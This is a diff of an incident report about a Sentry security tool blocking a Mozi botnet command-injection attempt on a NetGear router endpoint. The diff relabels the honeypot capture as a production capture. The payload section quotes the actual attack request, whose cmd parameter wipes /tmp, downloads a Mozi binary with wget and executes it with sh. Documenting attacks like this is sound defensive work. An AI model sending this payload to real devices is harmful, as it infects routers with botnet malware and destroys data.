@@ -1,9 +1,9 @@
 ---
 title: "Mozi: RCE attempt"
-description: "Mozi worm tries a NetGear router command injection against the honeypot; 88/100 critical, blocked at the edge with 403, IP banned for 24h, zero execution"
+description: "Mozi worm tries a NetGear router command injection against an internet-exposed target; 88/100 critical, blocked at the edge with 403, IP banned for 24h, zero execution"
 ---
 
-# Incident Report — Mozi Botnet RCE Attempt (Honeypot Capture)
+# Incident Report — Mozi Botnet RCE Attempt (Production Capture)
 
 > **Original source:**
 > [`incident-report-mozi-rce.md`](https://github.com/IDjinn/sentry/blob/main/examples/incident-report-mozi-rce.md)
@@ -12,7 +12,7 @@ description: "Mozi worm tries a NetGear router command injection against the hon
 ## TL;DR
 
 A worm payload tried to exploit a NetGear router command injection against
-the honeypot. Sentry's `CmdInjection` heuristic matched the attack string in
+the target. Sentry's `CmdInjection` heuristic matched the attack string in
 the query, scored the request **88/100 (critical)**, the edge **blocked it
 with 403 before it ever reached the upstream**, the source IP was banned for
 24h, and post-incident forensics confirmed **zero execution and zero
@@ -34,7 +34,7 @@ fully automatic.
 
 ## The payload
 
-```
+```http
 GET /setup.cgi?next_file=netgear.cfg&todo=syscmd
     &cmd=rm -rf /tmp/*;wget http://192.168.1.1:8088/Mozi.m -O /tmp/netgear;sh netgear
     &curpath=/&currentsetting.htm=1
